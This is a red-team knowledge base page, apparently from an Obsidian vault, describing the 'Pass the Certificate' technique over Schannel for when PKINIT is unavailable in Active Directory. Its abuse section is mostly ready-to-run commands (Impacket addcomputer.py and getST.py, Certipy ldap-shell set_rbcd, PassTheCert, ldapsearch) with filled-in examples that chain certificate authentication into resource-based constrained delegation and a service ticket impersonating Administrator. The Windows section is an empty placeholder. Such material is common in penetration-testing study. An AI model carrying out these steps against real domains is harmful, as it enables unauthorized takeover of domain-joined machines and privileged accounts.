---
Primary_category: "[[SCHANNEL]]"
title: "PASS THE CERTIFICATE (SCHANNEL)"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[SCHANNEL]]

#### *Theory*

In an *AD environment*, once an operator obtains a certificate with an *EKU* enabled that allows some kind of *Client Authentication*, the logical and usual next step is to initialize an *AS Exchange via PKINIT Certificate Trust* in order to obtain a *Ticket Granting Ticket ( TGT )* as the principal *( User or Computer Account )* for which the certificate in question has been issued, which usually appears in the certificate subject *( SID, SAN, UPN and so on )*

However, this approach is not always feasible, usually because the *DC's Certificate* does not have the *Smart Card Logon EKU*, which is an essential requirement for the *DC* to support *PKINIT*

Therefore, if we perform ***[[PASS THE CERTIFICATE|PtC]]*** to obtain a *TGT* through *PKINIT* against a *DC* whose certificate does not have the mentioned *EKU*, we will receive the following error

```bash
KDC_ERR_PADATA_TYPE_NOSUPP
```

And here comes to play *Schannel*, which is the *Miscrosoft SSL/TLS* implementation on *Windows* and supports both client and server authentication

Thus, we can leverage the issued certificate to authenticate ourselves against *LDAPS* or *LDAP ( STARTTLS enabled )* and perform certain actions such as →

- ***Add, Rename or Delete a Computer Account***

> ***Leveraging the Domain MAQ ( Machine Account Quota )***

- ***Perform LDAP Queries***

- ***Computer Account Certificate → RBCD***

> ***Populate and clear its `msDS-AllowedToActOnBehalfOfOtherIdentities`***

- ***Grant DCSync Rights***

This technique is basically an alternative to *PKINIT*

---

#### *Abuse - UNIX-Like*

##### *Workflow*

Let's suppose that we already have a certificate related to domain computer account which has the *Client Authentication Extended Key Usage ( EKU )* enabled, but the *DC* does not support *PKINIT* authentication, so we cannot neither retrieve a valid *TGT* related to the computer account nor perform ***[[UNPAC THE HASH|UnPac the Hash]]*** to extract the *NT* hash from the *TGT's PAC*

In this situation, we can leverage *Schannel* to authenticate ourselves against the *DC's LDAP server*, either using *LDAPs* or *LDAP* with *STARTTLS* enabled

As we are acting on behalf of the given domain computer account and, by default, any domain computer account has *WriteProperty* right on its own *ms-DS-AllowedToActOnBehalfOfOtherIdentity* attribute, we can carry out a ***[[RBCD|RBCD]]***

Before modifying the aforementioned attribute, we have to leverage the *ms-DS-MachineAccountQuota* domain attribute in order to add a computer account to the domain, as we need a domain service account under our control to be able to carry out a *Full S4U ( i.e. S4U2Self + S4U2Proxy )* and request a *Service Ticket* as any user to authenticate to a specific service of the computer account victim

To do so, we need a valid domain user account, which we have compromised previously

So, the steps would be as follows

- ***Add a new computer account to the domain***

- ***Enable RBCD on the target computer account through LDAPs Authentication via Schannel***

- ***Request a Service Ticket for an specific target computer account's service by carrying out a Full S4U***

- ***[[PASS THE TICKET|Pass the Ticket]] to compromise the domain-joined machine related to the computer account***

##### *Requirements*

- ***A valid Certificate in PFX format***

> ***Prior acquisition via [[ADCS - ESC1|ESC1]], [[ADCS - ESC8|ESC8]], [[SHADOW CREDENTIALS|Shadow Credentials]] and so on***

##### *Abuse*

###### *Adding a Computer Account to the Domain*

- ***[Impacket's AddComputer.py](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py)***

```bash
addcomputer.py -dc-ip '<DC_IP>' -computer-name '<COMPUTER_NAME>$' -computer-pass '<COMPUTER_PASSWD>' '<DOMAIN>/<USER>:<PASSWD>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> addcomputer.py -dc-ip '10.10.10.5' -computer-name 'WKS99$' -computer-pass 'password1234$!' 'DOMAIN.INTERNAL/john.doe:lDaP_1n_th3_cle4r!'
> ```
>

###### *Modifying the RBCD attribute of the target Computer Account via Schannel*

- ***[Certipy](https://github.com/ly4k/Certipy)***

***Setup***

```bash
mkdir Certipy
cd !$ && python3 -m venv .venv
. !$/bin/activate && pip3 install certipy-ad
```

***Usage***

```bash
certipy auth -dc-ip '<DC_IP>' -pfx '<PFX_CERTIFCATE>' -ldap-shell
```

> [!DANGER]- *e.g.*
>
> ```bash
> certipy auth -dc-ip 10.10.10.5 -pfx 'MKT03$.pfx' -ldap-shell
> ```
>

```bash
> set_rbcd '<TARGET>' '<GRANTEE>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> > set_rbcd 'MKT03$' 'WKS99$'
> ```
>

- ***[PassTheCert](https://github.com/AlmondOffSec/PassTheCert)***

***Setup***

> ***Downloading the script***

```bash
curl --silent --location --request GET --remote-name 'https://github.com/AlmondOffSec/PassTheCert/raw/refs/heads/main/Python/passthecert.py'
```

> ***Extracting both certificate and private key from the PFX***

```bash
certipy cert -pfx '<PFX>' -nokey -out '<OUTPUT_CERTIFICATE>'
certipy cert -pfx '<PFX>' -nocert -out '<OUTPUT_PRIVATE_KEY>'
# Or
openssl pkcs12 -in '<PFX>' -clcerts -nokeys -out '<OUTPUT_CERTIFICATE>'
openssl pkcs12 -in '<PFX>' -nocerts -out '<OUTPUT_PRIVATE_KEY>'
```

***Usage***

```bash
python3 passthecert.py -action 'read_rbcd' -domain '<DOMAIN>' -dc-host '<DC_FQDN>' -delegate-to '<TARGET>$' -crt '<CERTIFICATE>' -key '<PRIVATE_KEY>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 passthecert.py -action 'read_rbcd' -domain 'DOMAIN.INTERNAL' -dc-host 'DC01.DOMAIN.INTERNAL' -delegate-to 'MKT03$' -crt user.crt -key user.key
> ```
>

###### *Enumerating the target Computer Account SPNs*

- ***[LDAPSearch](https://docs.ldap.com/ldap-sdk/docs/tool-usages/ldapsearch.html)***

***Setup***

```bash
kinit <PRINCIPAL>@<DOMAIN>
```

***Usage***

```bash
ldapsearch -LLL -Y GSSAPI -H 'ldap://<DC_FQDN>' -b 'DC=<DOMAIN>,DC=<TLD>' '(samAccountName=<TARGET_COMPUTER_ACCOUNT>)' servicePrincipalName
```

> [!DANGER]- *e.g.*
>
> ```bash
> kinit john.doe@DOMAIN.INTERNAL
> ```
>
> ```bash
> ldapsearch -LLL -Y GSSAPI -H 'ldap://DC01.DOMAIN.INTERNAL' -b 'DC=DOMAIN,DC=INTERNAL' '(samAccountName=MKT03$)' servicePrincipalName
> ```
>

###### *Performing a Full S4U to request a Service Ticket for the target Computer Account as any domain principal*

- ***[Impacket's GetST.py](https://github.com/fortra/impacket/blob/master/examples/getST.py)***

```bash
getST.py -dc-ip '<DC_IP>' -spn '<EXISTING_SPN>' -impersonate '<IMPERSONATED_USER>' '<DOMAIN>/<CONTROLLED_COMPUTER_ACCOUNT>$:<PASSWD>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> getST.py -dc-ip '10.10.10.5' -spn 'HOST/MKT03.DOMAIN.INTERNAL' -impersonate 'Administrator' 'DOMAIN.INTERNAL/WKS99$:password1234$!'
> ```
>

---

#### *Abuse - Windows*

> 🛠️⌛

---

#### *Resources*

***[Authenticating with Certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)***